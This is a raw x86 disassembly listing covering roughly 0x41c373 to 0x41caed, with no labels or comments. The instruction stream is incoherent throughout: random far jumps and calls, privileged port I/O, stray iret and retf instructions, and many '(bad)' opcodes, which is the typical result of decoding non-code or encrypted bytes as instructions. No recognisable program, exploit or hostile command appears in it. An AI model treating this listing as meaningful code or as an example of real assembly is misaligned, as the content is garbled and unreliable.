  41c373:	or     DWORD PTR [edi+0x5c],ebp
  41c376:	mov    dl,0x7c
  41c378:	clc    
  41c379:	sub    DWORD PTR [edi+0x6b85ece4],0xffffffdc
  41c380:	mov    esi,0x2ece12f2
  41c385:	ffreep st(7)
  41c387:	out    0xf5,al
  41c389:	mov    edi,0x3f5f9dc7
  41c38e:	in     al,0xea
  41c390:	xchg   ebp,eax
  41c391:	sar    BYTE PTR [ebx+0x7f],0xfd
  41c395:	sbb    ch,BYTE PTR [ebp+0x2b]
  41c398:	test   BYTE PTR [ecx-0x13ebe359],bl
  41c39e:	dec    ebp
  41c39f:	imul   eax
  41c3a1:	mov    ds:0x94b872b2,al
  41c3a6:	leave  
  41c3a7:	out    0xe6,al
  41c3a9:	mov    edi,0xff1be3b8
  41c3ae:	out    dx,eax
  41c3af:	xchg   ebp,eax
  41c3b0:	iret   
  41c3b1:	fnstenv [eax+0xbdb88be]
  41c3b7:	out    0x0,al
  41c3b9:	sahf   
  41c3ba:	daa    
  41c3bb:	jmp    0xa02db527
  41c3c0:	cmp    eax,0xee7d8f9b
  41c3c5:	pushf  
  41c3c6:	jge    0x41c3a7
  41c3c8:	pop    ebx
  41c3c9:	iret   
  41c3ca:	dec    BYTE PTR [ebp+0x63]
  41c3cd:	fnsave [edi]
  41c3cf:	mov    ebx,0x5159afca
  41c3d4:	es mov ebx,0xf39ca433
  41c3da:	aam    0x8d
  41c3dc:	mov    edi,0xae39e30c
  41c3e1:	or     al,0xc
  41c3e3:	sub    cl,BYTE PTR [edi+0x52eb04a9]
  41c3e9:	push   ebx
  41c3ea:	dec    esi
  41c3eb:	popa   
  41c3ec:	sbb    al,0x65
  41c3ee:	push   es
  41c3ef:	out    dx,al
  41c3f0:	mov    ds:0x58655c51,al
  41c3f5:	sub    al,BYTE PTR [esi]
  41c3f7:	push   esp
  41c3f8:	into   
  41c3f9:	out    0xb8,eax
  41c3fb:	xor    eax,0x671965c9
  41c400:	jo     0x41c46c
  41c402:	mov    bl,0x36
  41c404:	pop    ebp
  41c405:	retf   0x1d93
  41c408:	inc    edx
  41c409:	stos   DWORD PTR es:[edi],eax
  41c40a:	sbb    DWORD PTR [ebp-0x4bd3319a],0x1a0d7260
  41c414:	sbb    BYTE PTR [eax],bh
  41c416:	inc    edi
  41c417:	in     eax,dx
  41c418:	or     ch,BYTE PTR [edx+0x5b]
  41c41b:	bound  ebp,QWORD PTR [eax]
  41c41d:	fldcw  WORD PTR [edx+0x3d]
  41c420:	sbb    edi,DWORD PTR [ebx+0x685d8d91]
  41c426:	cmp    eax,edi
  41c428:	(bad)  
  41c429:	sti    
  41c42a:	mov    DWORD PTR [edi-0x62f0d80e],esi
  41c430:	xchg   bl,cl
  41c432:	pop    edi
  41c433:	(bad)  
  41c434:	mov    dl,0xbd
  41c436:	popf   
  41c437:	cs scas eax,DWORD PTR es:[edi]
  41c439:	push   edx
  41c43a:	iret   
  41c43b:	pop    esi
  41c43c:	stos   DWORD PTR es:[edi],eax
  41c43d:	test   al,0xcd
  41c43f:	int    0x14
  41c441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c442:	les    ecx,FWORD PTR [eax-0x40]
  41c445:	sbb    BYTE PTR [edi-0x6939eac9],cl
  41c44b:	add    al,0xa0
  41c44d:	mov    eax,DWORD PTR [ecx+0x355a4310]
  41c453:	xor    DWORD PTR [eax+0x31742a25],eax
  41c459:	shr    BYTE PTR [edx+0x48],cl
  41c45c:	jmp    0xaacda93
  41c461:	inc    esp
  41c462:	sub    cl,BYTE PTR [esi+eiz*4+0x6c6da2e1]
  41c469:	cdq    
  41c46a:	dec    esi
  41c46b:	add    edi,DWORD PTR [ebx-0x4b3934ed]
  41c471:	jecxz  0x41c45d
  41c473:	jl     0x41c3fc
  41c475:	stos   DWORD PTR es:[edi],eax
  41c476:	int    0x35
  41c478:	mov    dh,0xbb
  41c47a:	sbb    DWORD PTR [ebp+0x70],ecx
  41c47d:	sbb    BYTE PTR [esi+0x68786a08],dl
  41c483:	mov    dh,0xc2
  41c485:	pop    ds
  41c486:	outs   dx,DWORD PTR ds:[esi]
  41c487:	ffreep st(1)
  41c489:	(bad)  [edi]
  41c48b:	outs   dx,BYTE PTR ds:[esi]
  41c48c:	loope  0x41c445
  41c48e:	data16 (bad) 
  41c490:	or     DWORD PTR [esi-0x6b],ebp
  41c493:	ret    
  41c494:	sub    ecx,ebx
  41c496:	jl     0x41c4d8
  41c498:	or     ebx,edx
  41c49a:	sbb    BYTE PTR [ebx+0x495a4bc1],dl
  41c4a0:	dec    ebp
  41c4a1:	mov    BYTE PTR [ebx],0x8c
  41c4a4:	test   BYTE PTR [esi-0x6ca9a86d],0xf0
  41c4ab:	adc    dl,BYTE PTR [ebx+0x798d44fe]
  41c4b1:	dec    esi
  41c4b2:	mov    eax,0x5043090d
  41c4b7:	and    dh,BYTE PTR [ecx]
  41c4b9:	add    al,0xb4
  41c4bb:	or     DWORD PTR [eax+0x47],ebp
  41c4be:	inc    esi
  41c4bf:	psraw  mm4,QWORD PTR [eax]
  41c4c2:	inc    ebx
  41c4c3:	adc    BYTE PTR [ebx-0x13d3f77],dl
  41c4c9:	imul   DWORD PTR [ebx+0x35cfdf39]
  41c4cf:	add    ecx,ecx
  41c4d1:	add    al,ah
  41c4d3:	ret    0xe4eb
  41c4d6:	xlat   BYTE PTR ds:[ebx]
  41c4d7:	das    
  41c4d8:	pop    esi
  41c4d9:	xchg   ecx,eax
  41c4da:	repz sti 
  41c4dc:	fmul   DWORD PTR [ebx]
  41c4de:	(bad)  
  41c4df:	hlt    
  41c4e0:	sti    
  41c4e1:	mov    ds:0xde170507,al
  41c4e6:	and    BYTE PTR [ecx],bh
  41c4e8:	push   0xffffffe9
  41c4ea:	iret   
  41c4eb:	scas   eax,DWORD PTR es:[edi]
  41c4ec:	mov    edi,0x23e164d2
  41c4f1:	cli    
  41c4f2:	and    bl,BYTE PTR [edi]
  41c4f4:	add    dl,BYTE PTR [ebx+0x576b96bd]
  41c4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4fb:	xor    al,0x73
  41c4fd:	in     eax,0xd0
  41c4ff:	icebp  
  41c500:	adc    eax,0x5cc6d656
  41c505:	jle    0x41c507
  41c507:	into   
  41c508:	ds mov dl,0xc1
  41c50b:	pop    edi
  41c50c:	sub    edi,DWORD PTR [edi+0x11cdab8a]
  41c512:	mov    dh,0x3a
  41c514:	mov    eax,ds:0xb43d298d
  41c519:	cmp    BYTE PTR [ebp+ecx*4-0x3d18c5cc],bh
  41c520:	aad    0x96
  41c522:	aas    
  41c523:	std    
  41c524:	test   DWORD PTR [esi-0x66878005],ecx
  41c52a:	idiv   DWORD PTR [edi-0xc]
  41c52d:	sub    ch,BYTE PTR [edi-0x589e1051]
  41c533:	stos   DWORD PTR es:[edi],eax
  41c534:	mov    ecx,0xfae5b575
  41c539:	mov    ebx,0x92eddd94
  41c53e:	ja     0x41c5bf
  41c540:	push   0xffffffc2
  41c542:	mov    dl,0x3b
  41c544:	ret    0x7f6b
  41c547:	or     al,0x4e
  41c549:	pushf  
  41c54a:	push   ds
  41c54b:	mov    al,0xbd
  41c54d:	mov    ch,0xb
  41c54f:	and    dh,BYTE PTR [ebp+ebp*8-0xe8cb522]
  41c556:	loop   0x41c593
  41c558:	mov    edi,0x1781529c
  41c55d:	or     al,0x4
  41c55f:	jl     0x41c4ff
  41c561:	stos   DWORD PTR es:[edi],eax
  41c562:	inc    BYTE PTR [edx]
  41c564:	cld    
  41c565:	mov    ebx,0xdb781ee7
  41c56a:	xchg   ebx,eax
  41c56b:	dec    edi
  41c56c:	mov    edx,0xff67f3ff
  41c571:	lock lds edx,FWORD PTR [ecx]
  41c574:	sti    
  41c575:	aas    
  41c576:	or     eax,0x4545f2ca
  41c57b:	imul   ebp,DWORD PTR [ecx-0x65],0x6c67290e
  41c582:	scas   al,BYTE PTR es:[edi]
  41c583:	jl     0x41c509
  41c585:	push   eax
  41c586:	dec    esp
  41c587:	xchg   ecx,eax
  41c588:	mov    dl,0xc1
  41c58a:	jp     0x41c54d
  41c58c:	pop    ss
  41c58d:	imul   ecx,DWORD PTR [esi+esi*1+0x366cd99a],0x56ab2c5
  41c598:	jecxz  0x41c5c6
  41c59a:	and    edx,DWORD PTR [ebx+0x50]
  41c59d:	sbb    BYTE PTR [edi+0x13],al
  41c5a0:	add    esp,DWORD PTR [esi-0xc1cd5ef]
  41c5a6:	bound  edx,QWORD PTR [eax+0x34109eae]
  41c5ac:	xchg   ebp,eax
  41c5ad:	in     al,dx
  41c5ae:	pushf  
  41c5af:	inc    ebp
  41c5b0:	mov    ds:0x2e910932,eax
  41c5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b6:	xor    al,0x20
  41c5b8:	dec    edx
  41c5b9:	retf   0xfba7
  41c5bc:	pop    esi
  41c5bd:	mov    ch,0x79
  41c5bf:	or     ah,ch
  41c5c1:	xor    al,0xe
  41c5c3:	aaa    
  41c5c4:	mov    ch,0x88
  41c5c6:	js     0x41c602
  41c5c8:	sub    al,0x82
  41c5ca:	mov    eax,ds:0x576265d0
  41c5cf:	adc    BYTE PTR [esi-0x54],0x89
  41c5d3:	mov    al,0xbb
  41c5d5:	(bad)  [eax-0x1b276d95]
  41c5db:	rcr    BYTE PTR [ecx],1
  41c5dd:	push   esi
  41c5de:	int    0xed
  41c5e0:	adc    al,0xd5
  41c5e2:	lea    esi,[esp+ebp*2-0x60]
  41c5e6:	pop    esp
  41c5e7:	lds    ebx,FWORD PTR [eax+0x2c51dc44]
  41c5ed:	inc    esi
  41c5ee:	mov    al,BYTE PTR [eax+eiz*8]
  41c5f1:	cdq    
  41c5f2:	add    al,0x69
  41c5f4:	test   eax,0x106d4476
  41c5f9:	or     al,0x6d
  41c5fb:	je     0x41c5b6
  41c5fd:	sub    eax,0x8c515139
  41c602:	sub    al,dh
  41c604:	adc    eax,0x588d9b9c
  41c609:	outs   dx,DWORD PTR ds:[esi]
  41c60a:	xchg   BYTE PTR [ebx+ebp*2+0x336ae60b],bl
  41c611:	or     BYTE PTR [esi-0x28c90648],dl
  41c617:	sar    BYTE PTR [edi+0xf9c78b2],1
  41c61d:	int3   
  41c61e:	outs   dx,DWORD PTR ds:[esi]
  41c61f:	popa   
  41c620:	sbb    al,BYTE PTR [ebx+edx*4+0x296e236b]
  41c627:	sub    al,0x9f
  41c629:	ds mov edi,0x729191c9
  41c62f:	mov    ah,0x56
  41c631:	int3   
  41c632:	sahf   
  41c633:	jb     0x41c5f8
  41c635:	leave  
  41c636:	xor    eax,0xd029409c
  41c63b:	xchg   edx,eax
  41c63c:	call   0x8d3d:0x3bec8277
  41c643:	cmp    eax,0xb4ad2eb3
  41c648:	pop    ecx
  41c649:	daa    
  41c64a:	gs popa 
  41c64c:	dec    eax
  41c64d:	or     eax,DWORD PTR [edx+0x10]
  41c650:	and    al,0xdd
  41c652:	inc    BYTE PTR [esi-0x2f]
  41c655:	ss mov ebp,0x8a8d7fb6
  41c65b:	pusha  
  41c65c:	xor    al,0xa4
  41c65e:	jge    0x41c678
  41c660:	inc    ecx
  41c661:	ret    0xd4be
  41c664:	dec    edi
  41c665:	(bad)  
  41c666:	fldcw  WORD PTR [ecx+0x5f]
  41c669:	iret   
  41c66a:	pop    edi
  41c66b:	pop    esp
  41c66c:	or     al,0x99
  41c66e:	es sub al,0xfd
  41c671:	jle    0x41c6c5
  41c673:	cmp    DWORD PTR [eax+0x48c4110c],edx
  41c679:	into   
  41c67a:	and    DWORD PTR [ecx+esi*1+0x28],esi
  41c67e:	and    eax,0x8fee1275
  41c683:	adc    ebx,ebp
  41c685:	test   eax,0x702c0b46
  41c68a:	mov    cl,0xc4
  41c68c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c68d:	jbe    0x41c676
  41c68f:	jge    0x41c64c
  41c691:	fistp  QWORD PTR [edi]
  41c693:	push   es
  41c694:	push   es
  41c695:	and    al,0xa
  41c697:	cmp    ebx,DWORD PTR [ebx+0x73]
  41c69a:	retf   0x32da
  41c69d:	pop    esi
  41c69e:	sbb    eax,0xe13dbbb1
  41c6a3:	inc    ebx
  41c6a4:	call   DWORD PTR [edx+0x71]
  41c6a7:	aas    
  41c6a8:	jmp    FWORD PTR [ecx]
  41c6aa:	pop    esi
  41c6ab:	jae    0x41c695
  41c6ad:	xor    eax,0xe6d9a07c
  41c6b2:	nop
  41c6b3:	mov    ecx,0xb410214c
  41c6b8:	in     eax,0xa6
  41c6ba:	loop   0x41c661
  41c6bc:	cmp    BYTE PTR [edx],ch
  41c6be:	ss cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41c6c1:	iret   
  41c6c2:	lods   eax,DWORD PTR gs:[esi]
  41c6c4:	jecxz  0x41c689
  41c6c6:	(bad)  
  41c6c7:	jmp    0x41c6d1
  41c6c9:	dec    DWORD PTR [ebx-0x5c5d0e71]
  41c6cf:	(bad)  
  41c6d0:	jo     0x41c6fd
  41c6d2:	sub    eax,0x3d75df77
  41c6d7:	(bad)  
  41c6d8:	pop    edi
  41c6d9:	in     eax,0x79
  41c6db:	jl     0x41c68c
  41c6dd:	loope  0x41c6b0
  41c6df:	cmc    
  41c6e0:	imul   ebx,DWORD PTR [esi+ebx*2],0x9
  41c6e4:	mov    esp,0xe06ec7e9
  41c6e9:	push   edi
  41c6ea:	jle    0x41c768
  41c6ec:	pop    es
  41c6ed:	mov    dl,0xb0
  41c6ef:	enter  0xb26c,0x7d
  41c6f3:	neg    DWORD PTR [ecx-0x60540129]
  41c6f9:	out    0x37,al
  41c6fb:	(bad)  
  41c6fc:	neg    BYTE PTR [ebx+0x7b330f3f]
  41c702:	shl    DWORD PTR [edi-0x17e653e9],0x73
  41c709:	imul   edi,esi,0xfde40fb9
  41c70f:	pop    ds
  41c710:	sar    DWORD PTR [eax+edi*8],0xb1
  41c714:	(bad)  
  41c715:	retf   
  41c716:	inc    edi
  41c717:	out    dx,eax
  41c718:	jg     0x41c706
  41c71a:	int    0xbe
  41c71c:	scas   al,BYTE PTR es:[edi]
  41c71d:	pop    edi
  41c71e:	mov    ebx,0x465c747a
  41c723:	pusha  
  41c724:	fimul  WORD PTR [ecx+ebx*4-0x52]
  41c728:	cmp    eax,0xdeebd5cd
  41c72d:	dec    ebp
  41c72e:	cmp    ebx,edx
  41c730:	(bad)  
  41c731:	push   esi
  41c732:	dec    edx
  41c733:	xor    DWORD PTR [esi],edx
  41c735:	pop    esp
  41c736:	xchg   ecx,eax
  41c737:	jle    0x41c709
  41c739:	inc    edx
  41c73a:	inc    ecx
  41c73b:	mov    esp,0x3e0379c5
  41c740:	adc    edx,ebx
  41c742:	imul   edx,DWORD PTR [ebx+0x50],0x1a
  41c746:	dec    edi
  41c747:	imul   edi,DWORD PTR [ebp+0x52],0x4c1b69f0
  41c74e:	dec    eax
  41c74f:	aam    0x5e
  41c751:	and    ebp,DWORD PTR [ecx+0x24c4ef9e]
  41c757:	adc    BYTE PTR [eax+0x6069ec89],0x1a
  41c75e:	push   ebx
  41c75f:	pop    edx
  41c760:	pusha  
  41c761:	lds    esp,FWORD PTR [ecx+0x78353a06]
  41c767:	sub    edx,DWORD PTR [esi+ecx*2-0x59c46127]
  41c76e:	jae    0x41c7bb
  41c770:	in     al,dx
  41c771:	push   0xffffffba
  41c773:	test   al,0x29
  41c775:	inc    esp
  41c776:	aaa    
  41c777:	mov    ss,WORD PTR [edi-0x647d4073]
  41c77d:	xchg   esi,eax
  41c77e:	pop    edi
  41c77f:	retf   0xb952
  41c782:	dec    esi
  41c783:	in     eax,0x76
  41c785:	or     ebp,ebx
  41c787:	push   edx
  41c788:	ret    0xac23
  41c78b:	lds    ebx,FWORD PTR [edx]
  41c78d:	popa   
  41c78e:	sub    esi,DWORD PTR ss:[ecx]
  41c791:	pop    edx
  41c792:	xor    DWORD PTR [ebx+ebp*2-0x6c],esi
  41c796:	jle    0x41c7b1
  41c798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c799:	(bad)
  41c79c:	and    ch,BYTE PTR [esi]
  41c79e:	jmp    0x41c76d
  41c7a0:	mov    ch,0x58
  41c7a2:	push   ebx
  41c7a3:	sar    DWORD PTR [ebx],cl
  41c7a5:	and    eax,0x81d20891
  41c7aa:	add    al,0x8c
  41c7ac:	mov    eax,0xed39654
  41c7b1:	sub    ebx,DWORD PTR [esi]
  41c7b3:	dec    ebx
  41c7b4:	int    0xb5
  41c7b6:	jbe    0x41c7b8
  41c7b8:	jecxz  0x41c7cf
  41c7ba:	inc    esi
  41c7bb:	add    DWORD PTR [ecx],0xffffffe3
  41c7be:	popa   
  41c7bf:	(bad)
  41c7c2:	bound  esi,QWORD PTR [ebp+0x54]
  41c7c5:	mov    cl,0x36
  41c7c7:	lods   al,BYTE PTR ds:[esi]
  41c7c8:	pop    eax
  41c7c9:	sbb    DWORD PTR [ebp+0x5c],edx
  41c7cc:	ficomp DWORD PTR [ecx+0x4ab744f3]
  41c7d2:	add    BYTE PTR [esi-0x45],ch
  41c7d5:	outs   dx,BYTE PTR ds:[esi]
  41c7d6:	xchg   ebp,eax
  41c7d7:	inc    ecx
  41c7d8:	xchg   ecx,eax
  41c7d9:	cmp    BYTE PTR [ebx+ebx*1],cl
  41c7dc:	cmp    esi,DWORD PTR [ebx]
  41c7de:	pop    esi
  41c7df:	mov    esi,0x514ac1bc
  41c7e4:	repnz dec esp
  41c7e6:	jecxz  0x41c7a0
  41c7e8:	mov    ah,0x33
  41c7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7eb:	test   al,0x4b
  41c7ed:	pop    esp
  41c7ee:	mov    WORD PTR [eax-0x73],?
  41c7f1:	adc    al,0xa4
  41c7f3:	pop    ecx
  41c7f4:	add    DWORD PTR [ecx],esi
  41c7f6:	out    0xfa,eax
  41c7f8:	pop    ecx
  41c7f9:	sub    BYTE PTR [eax],bl
  41c7fb:	push   ecx
  41c7fc:	and    DWORD PTR [eax-0xb9679d4],ecx
  41c802:	and    DWORD PTR [ebp-0x39ca5a1c],ebx
  41c808:	dec    eax
  41c809:	ins    BYTE PTR es:[edi],dx
  41c80a:	shr    edx,cl
  41c80c:	dec    edi
  41c80d:	add    al,0xc9
  41c80f:	test   eax,0x4bc79f54
  41c814:	in     al,dx
  41c815:	imul   edi,ecx,0x9
  41c818:	pop    es
  41c819:	mov    al,ds:0x8eccf117
  41c81e:	mov    ds:0xe119fe67,al
  41c823:	rcl    BYTE PTR [edx+0x1d],0xd3
  41c827:	imul   esp,DWORD PTR [edx-0x61],0xffffffda
  41c82b:	out    0x3a,eax
  41c82d:	jle    0x41c851
  41c82f:	pusha  
  41c830:	hlt    
  41c831:	les    eax,FWORD PTR [eax+0x3ed017cc]
  41c837:	mov    dl,0xcf
  41c839:	out    0xbc,al
  41c83b:	pop    ds
  41c83c:	je     0x41c834
  41c83e:	out    0xdc,eax
  41c840:	repz or dl,BYTE PTR [esi]
  41c843:	out    0xbf,eax
  41c845:	rol    BYTE PTR [eax],0xd
  41c848:	pop    ecx
  41c849:	push   0x7c923931
  41c84e:	lods   al,BYTE PTR ds:[esi]
  41c84f:	jbe    0x41c86f
  41c851:	sub    BYTE PTR [ebx],cl
  41c853:	retf   
  41c854:	push   0xfaf6c879
  41c859:	cs dec edi
  41c85b:	mov    esi,0x57f0e6b7
  41c860:	dec    esp
  41c861:	mov    ecx,0xf384746e
  41c866:	icebp  
  41c867:	sub    DWORD PTR [esi+0x26],eax
  41c86a:	lock mov ds:0x71a64ef2,al
  41c870:	xchg   ebx,eax
  41c871:	(bad)  
  41c872:	in     eax,dx
  41c873:	jle    0x41c7f7
  41c875:	aas    
  41c876:	clc    
  41c877:	out    0xb7,eax
  41c879:	inc    ecx
  41c87a:	imul   edi,DWORD PTR [ecx],0x72
  41c87d:	bound  edx,QWORD PTR [ebp+0x4f099ddd]
  41c883:	mov    edi,0x3e4f9973
  41c888:	and    al,0x4c
  41c88a:	pop    edi
  41c88b:	cld    
  41c88c:	cmp    BYTE PTR [edi-0x66a3f392],ah
  41c892:	ins    DWORD PTR es:[edi],dx
  41c893:	jo     0x41c858
  41c895:	mov    eax,ds:0xcfc7791b
  41c89a:	pop    esp
  41c89b:	loope  0x41c846
  41c89d:	cmpps  xmm4,xmm3,0xe7
  41c8a1:	iret   
  41c8a2:	xor    DWORD PTR [edi-0x7d54d614],edi
  41c8a8:	leave  
  41c8a9:	not    BYTE PTR [eax+edx*1+0x7bb684e6]
  41c8b0:	int    0xdb
  41c8b2:	fistp  QWORD PTR [ebx-0xf]
  41c8b5:	lods   eax,DWORD PTR ds:[esi]
  41c8b6:	fcomip st,st(7)
  41c8b8:	sub    eax,0xaf9e4cb7
  41c8bd:	jge    0x41c93c
  41c8bf:	mov    cl,0xb6
  41c8c1:	pop    ss
  41c8c2:	xor    al,0x5
  41c8c4:	js     0x41c884
  41c8c6:	or     eax,0x99813740
  41c8cb:	das    
  41c8cc:	arpl   si,di
  41c8ce:	clc    
  41c8cf:	push   edi
  41c8d0:	(bad)  
  41c8d1:	call   0x1c0c6b31
  41c8d6:	jge    0x41c8bd
  41c8d8:	(bad)  
  41c8d9:	pop    ebp
  41c8da:	mov    BYTE PTR [ebp+ebp*4+0x6f],ch
  41c8de:	mov    ds:0x6e970983,eax
  41c8e3:	js     0x41c90c
  41c8e5:	mov    eax,ds:0x88ea619a
  41c8ea:	pop    ds
  41c8eb:	les    ebx,FWORD PTR es:[esi-0x4b]
  41c8ef:	dec    ebx
  41c8f0:	fidiv  DWORD PTR [esi-0x6b]
  41c8f3:	(bad)  
  41c8f4:	out    0xe1,eax
  41c8f6:	sbb    eax,0x22aa10a6
  41c8fb:	jne    0x41c8d8
  41c8fd:	mov    DWORD PTR [edx],ebp
  41c8ff:	shl    DWORD PTR [esi+0x42],cl
  41c902:	aam    0x96
  41c904:	fidivr DWORD PTR [edx+0x2627c7a4]
  41c90a:	xchg   ecx,eax
  41c90b:	jne    0x41c8d5
  41c90d:	mov    dh,BYTE PTR [ebx+0x68469812]
  41c913:	inc    ebx
  41c914:	mov    bh,BYTE PTR [ebp-0x43]
  41c917:	sub    eax,0x19c39c29
  41c91c:	inc    ebx
  41c91d:	ins    DWORD PTR es:[edi],dx
  41c91e:	test   edx,ebx
  41c920:	or     ebx,DWORD PTR [ebp-0x7c85da8]
  41c926:	add    DWORD PTR [eax+0x287f0695],ebx
  41c92c:	push   edx
  41c92d:	lods   al,BYTE PTR ds:[esi]
  41c92e:	inc    esi
  41c92f:	mov    edx,0xc6cf784a
  41c934:	cmp    ebx,DWORD PTR [ecx]
  41c936:	push   esp
  41c937:	inc    ebx
  41c938:	dec    esp
  41c939:	jns    0x41c944
  41c93b:	and    edi,DWORD PTR [ebx+0x4c]
  41c93e:	aad    0xe2
  41c940:	pop    esp
  41c941:	mov    ds:0xe1d6171d,al
  41c946:	pushf  
  41c947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c948:	ins    DWORD PTR es:[edi],dx
  41c949:	dec    ebx
  41c94a:	ss mov bh,0x6b
  41c94d:	push   0x420d4157
  41c952:	adc    DWORD PTR [ecx+0x7a24c912],0x7853c983
  41c95c:	push   ebx
  41c95d:	add    al,0x60
  41c95f:	add    eax,0x6270290a
  41c964:	adc    ebx,DWORD PTR [eax+0x26]
  41c967:	sahf   
  41c968:	mov    ah,0xbe
  41c96a:	daa    
  41c96b:	aam    0xdc
  41c96d:	in     al,dx
  41c96e:	into   
  41c96f:	mov    cl,0xbb
  41c971:	xor    esi,DWORD PTR [esi-0x3f0f082a]
  41c977:	pop    esp
  41c978:	test   dh,al
  41c97a:	sbb    bl,BYTE PTR [ebp+edx*1-0x1ea56332]
  41c981:	into   
  41c982:	push   ebx
  41c983:	stos   DWORD PTR es:[edi],eax
  41c984:	pushf  
  41c985:	mov    ecx,0x41870d6e
  41c98a:	arpl   dx,bp
  41c98c:	push   edx
  41c98d:	cmp    edx,DWORD PTR [ebp-0x7f]
  41c990:	xor    eax,0xf399a273
  41c995:	or     eax,0xac6e53cb
  41c99a:	add    al,0xb7
  41c99c:	mov    esi,0x8b657b45
  41c9a1:	retf   
  41c9a2:	iret   
  41c9a3:	outs   dx,BYTE PTR ds:[esi]
  41c9a4:	and    BYTE PTR [eax+edx*8-0x3e136d31],ah
  41c9ab:	cmc    
  41c9ac:	scas   al,BYTE PTR es:[edi]
  41c9ad:	fild   DWORD PTR [eax-0x6c8b8b2b]
  41c9b3:	lahf   
  41c9b4:	dec    edi
  41c9b5:	dec    esi
  41c9b6:	dec    ecx
  41c9b7:	mov    DWORD PTR [ecx+0x53],eax
  41c9ba:	cdq    
  41c9bb:	das    
  41c9bc:	xlat   BYTE PTR ds:[ebx]
  41c9bd:	fst    QWORD PTR [ecx-0x4f48562c]
  41c9c3:	sub    DWORD PTR [edx],edx
  41c9c5:	popa   
  41c9c6:	sub    bl,BYTE PTR [edx-0x6a05ef14]
  41c9cc:	xlat   BYTE PTR ds:[ebx]
  41c9cd:	and    al,0x75
  41c9cf:	sbb    eax,0xa403c321
  41c9d4:	mov    dh,0xfe
  41c9d6:	std    
  41c9d7:	lods   eax,DWORD PTR ds:[esi]
  41c9d8:	push   edi
  41c9d9:	adc    eax,0x3396ee78
  41c9de:	mov    bh,dh
  41c9e0:	xchg   edx,eax
  41c9e1:	(bad)  [edi-0x42ce17c0]
  41c9e7:	mov    edi,0xc874aef8
  41c9ec:	in     al,dx
  41c9ed:	mov    esp,fs
  41c9ef:	loopne 0x41c9dc
  41c9f1:	gs pop ds
  41c9f3:	jp     0x41ca2d
  41c9f5:	mov    al,0x4f
  41c9f7:	pop    edi
  41c9f8:	sbb    ch,dl
  41c9fa:	mov    eax,ds:0xe924de67
  41c9ff:	loop   0x41c994
  41ca01:	aaa    
  41ca02:	sbb    eax,0x9ff088c3
  41ca07:	(bad)  
  41ca08:	pop    ss
  41ca09:	dec    edi
  41ca0a:	int    0x90
  41ca0c:	lods   eax,DWORD PTR ds:[esi]
  41ca0d:	loopne 0x41c990
  41ca0f:	sbb    BYTE PTR [edx+0x6],0xec
  41ca13:	pop    esp
  41ca14:	pop    edx
  41ca15:	loope  0x41ca54
  41ca17:	idiv   esi
  41ca19:	jne    0x41c9d5
  41ca1b:	ins    DWORD PTR es:[edi],dx
  41ca1c:	(bad)  
  41ca1d:	fidiv  DWORD PTR [ecx+0x7e381055]
  41ca23:	jmp    0x9e69:0x96476b30
  41ca2a:	xor    al,0x3c
  41ca2c:	lock xor esp,DWORD PTR [edi-0x18044208]
  41ca33:	mov    esp,0xd669e4f8
  41ca38:	stos   DWORD PTR es:[edi],eax
  41ca39:	inc    edi
  41ca3a:	mov    al,0xa2
  41ca3c:	push   esp
  41ca3d:	xchg   esp,eax
  41ca3e:	test   BYTE PTR [edi],ah
  41ca40:	mov    ?,WORD PTR [eax]
  41ca42:	pop    esi
  41ca43:	push   ds
  41ca44:	popa   
  41ca45:	sbb    al,0x18
  41ca47:	das    
  41ca48:	sbb    BYTE PTR [ebx+0x68],ah
  41ca4b:	fwait
  41ca4c:	popf   
  41ca4d:	sar    esp,1
  41ca4f:	repnz in eax,0xdf
  41ca52:	stc    
  41ca53:	jb     0x41ca55
  41ca55:	add    al,0x5f
  41ca57:	adc    BYTE PTR [edi],al
  41ca59:	lock cmp al,0x78
  41ca5c:	(bad)  
  41ca5d:	std    
  41ca5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca5f:	test   DWORD PTR [ecx+0x7230fe3c],0xb7fb3fdf
  41ca69:	aaa    
  41ca6a:	push   0xffffffe0
  41ca6c:	pop    ds
  41ca6d:	fcmovnb st,st(2)
  41ca6f:	pop    ds
  41ca70:	mov    bh,0xd6
  41ca72:	adc    ah,BYTE PTR [ebx-0x3c]
  41ca75:	adc    al,0x1d
  41ca77:	repnz aad 0x1f
  41ca7a:	and    al,cl
  41ca7c:	add    al,0xad
  41ca7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca7f:	fcom   DWORD PTR [edx-0x4f]
  41ca82:	add    eax,0x430beba9
  41ca87:	push   ecx
  41ca88:	adc    eax,0xfc034b54
  41ca8d:	pusha  
  41ca8e:	rcl    dl,0x60
  41ca91:	int3   
  41ca92:	pop    edx
  41ca93:	mov    ebp,0x9c7ad0cc
  41ca98:	dec    ebp
  41ca99:	pop    esp
  41ca9a:	loopne 0x41cab4
  41ca9c:	adc    eax,0x49f38b42
  41caa1:	add    edi,0x880d285b
  41caa7:	or     eax,0xd0981304
  41caac:	mov    dl,0x17
  41caae:	sbb    bl,BYTE PTR [edx]
  41cab0:	push   ebp
  41cab1:	ins    BYTE PTR es:[edi],dx
  41cab2:	outs   dx,BYTE PTR ds:[esi]
  41cab3:	jbe    0x41cb26
  41cab5:	add    ah,BYTE PTR [ebp-0x1f7af9ed]
  41cabb:	lea    esp,[ecx+0x52b596f4]
  41cac1:	cmp    BYTE PTR [esi],dh
  41cac3:	adc    BYTE PTR [esi+0x1c],ch
  41cac6:	ror    BYTE PTR [ebp+0x15],0x9c
  41caca:	sub    bl,BYTE PTR [ebx+eax*8]
  41cacd:	add    cl,BYTE PTR [ebx+eax*1+0x5d8f1cef]
  41cad4:	sti    
  41cad5:	adc    ebp,DWORD PTR [ebx+edi*2+0x33]
  41cad9:	lea    esp,[ebp+eiz*8-0x7022a99b]
  41cae0:	dec    eax
  41cae1:	jp     0x41caa2
  41cae3:	and    DWORD PTR [ebp+0x4],eax
  41cae6:	sbb    cl,dl
  41cae8:	adc    al,0xc7
  41caea:	bound  edx,QWORD PTR [eax+0x1c]
  41caed:	inc    esi
